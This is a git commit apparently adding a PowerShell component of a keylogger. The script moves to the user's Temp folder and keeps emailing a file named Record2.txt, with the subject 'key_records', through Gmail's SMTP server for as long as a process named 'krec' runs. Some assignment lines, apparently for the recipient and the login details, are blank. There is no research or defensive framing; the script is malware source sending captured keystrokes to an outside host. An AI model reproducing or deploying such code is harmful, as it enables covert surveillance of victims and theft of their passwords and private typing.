dd4c0242e4c58b66ca4398255e5ab23264846a6d
pr0xy-8L4d3 <38928236+pr0xy-8L4d3@users.noreply.github.com>
2022-05-05 22:38:00 +0000

    Add files via upload

---
+++ lib/smkscr.ps1
@@ -0,0 +1,34 @@
+cd $env:USERPROFILE"\AppData\Local\Temp"
+$SMTPServer = "smtp.gmail.com"
+$SMTPPort = "587"
+$
+$
+
+Do
+{
+
+$
+$subject = "key_records"
+$body = "key records"
+$attachment = "Record2.txt"
+
+$message = New-Object System.Net.Mail.MailMessage
+$message.subject = $subject
+$message.body = $body
+$message.to.add($to)
+$message.from = $username
+$message.attachments.add($attachment)
+$smtp = New-Object System.Net.Mail.SmtpClient($SMTPServer, $SMTPPort);
+$smtp.EnableSSL = $true
+$smtp.Credentials = New-Object System.Net.NetworkCredential($Username, $Password);
+$smtp.send($message);
+
+start-sleep 5
+
+$message.Dispose() 
+
+$proc = Get-Process
+
+
+
+} While ($proc.name -contains 'krec') 
